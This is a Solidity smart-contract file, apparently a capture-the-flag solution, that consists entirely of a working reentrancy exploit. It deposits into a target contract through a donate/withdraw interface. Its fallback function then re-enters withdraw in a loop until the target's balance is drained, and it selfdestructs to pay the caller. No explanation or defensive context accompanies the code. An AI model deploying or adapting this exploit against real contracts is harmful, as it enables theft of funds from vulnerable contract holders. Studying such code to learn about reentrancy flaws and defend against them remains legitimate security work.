// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

uint256 constant WITHDRAW_LIMIT = 50;

interface IDonate {
    function donate(address _to) external payable;
    function withdraw(uint256 _amt) external;
}

contract SolveReentrance {
    event DrainedContract(address);

    IDonate public donateContract;
    uint256 donateAmt;

    constructor(address _target) payable {
        require(msg.value > 0, "msg.value must be > 0");

        donateContract = IDonate(_target);
        donateContract.donate{value: msg.value}(address(this));

        donateAmt = msg.value;
    }

    function withdrawAll() public {
        donateContract.withdraw(donateAmt);

        // transfer all balance to beneficiary
        uint256 remainBalance = address(donateContract).balance;
        if (remainBalance == 0) {
            emit DrainedContract(address(donateContract));
            selfdestruct(payable(msg.sender));
        }
    }

    receive() external payable {
        uint16 time = 0;
        uint256 remainBalance = address(donateContract).balance;

        while (remainBalance > 0 && time < WITHDRAW_LIMIT) {
            uint256 amount = donateAmt > remainBalance ? remainBalance : donateAmt;
            donateContract.withdraw(amount);

            time += 1;
            remainBalance -= amount;
        }
    }
}
